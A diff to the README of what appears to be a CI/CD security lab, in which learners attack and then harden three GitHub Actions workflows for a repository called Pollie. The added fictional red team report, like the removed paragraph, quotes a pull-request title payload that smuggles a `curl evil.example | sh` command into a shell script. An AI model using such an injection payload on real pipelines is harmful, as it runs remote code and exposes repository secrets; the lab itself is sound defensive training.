@@ -2,11 +2,19 @@
 
 ## The situation
 
+```text
+RED TEAM REPORT RT-2204 - Pollie CI/CD pipeline
+Result     : initial access achieved, no code review needed
+Method     : one pull request, one title
+Payload    : x"; curl evil.example | sh; echo "
+Impact     : arbitrary commands on the runner, with access to the repository secrets
+Evidence   : a polite report and a screenshot of the secrets they could have read
+Severity   : critical          Time to exploit: 4 minutes
+```
+
 A CI/CD pipeline is the most privileged thing a software team owns. It can read the source, it holds the registry token and the deploy key, it can publish a release that thousands of machines will install. And it runs **code that other people wrote**: every pull request, every dependency, every third-party action. If you can make a pipeline run your commands, you do not need to hack the server.
 
-Last week a security researcher opened a pull request against Pollie. The title was `x"; curl evil.example | sh; echo "`. No code review was needed: the pipeline pasted the title into a shell script, and the runner executed the rest. They sent a polite report and a screenshot of the secrets they could have read.
-
-You have three workflows from the Pollie repository (`ci.yml`, `preview.yml`, `release.yml`), each with real, common holes. You will watch an injection happen on your own machine, then close every hole **without breaking the pipeline**, because a pipeline that is secure and does not work is not a fix.
+The report is yours to answer. You have three workflows from the Pollie repository (`ci.yml`, `preview.yml`, `release.yml`), each with real, common holes. In **Act 1** you play the attacker and watch an injection happen on your own machine. In **Act 2** you defend: you close every hole **without breaking the pipeline**, because a pipeline that is secure and does not work is not a fix.
 
 > **Your mission**
 > - Run `attack/simulate.py` and see what a hostile pull request title turns into
@@ -18,7 +26,7 @@ You have three workflows from the Pollie repository (`ci.yml`, `preview.yml`, `r
 
 ---
 
-## Part 0 - Read the three workflows
+## Part 0 - Act 1: read the three workflows (the attacker's map)
 
 Fork this repository and clone your fork. Read `.github/workflows/ci.yml`, `preview.yml` and `release.yml`, and try to spot problems before reading further. The workflows are not run by the lab (nothing is deployed); the checker reads the YAML.
 
@@ -59,7 +67,7 @@ Fix it: switch to `pull_request`, remove the secret, keep the workflow useful (i
 
 ---
 
-## Part 3 - Least privilege
+## Part 3 - Act 2: least privilege (the defence starts here)
 
 Every job gets a `GITHUB_TOKEN`. Its default permissions depend on a repository setting and are often read **and write**. State what you need:
 
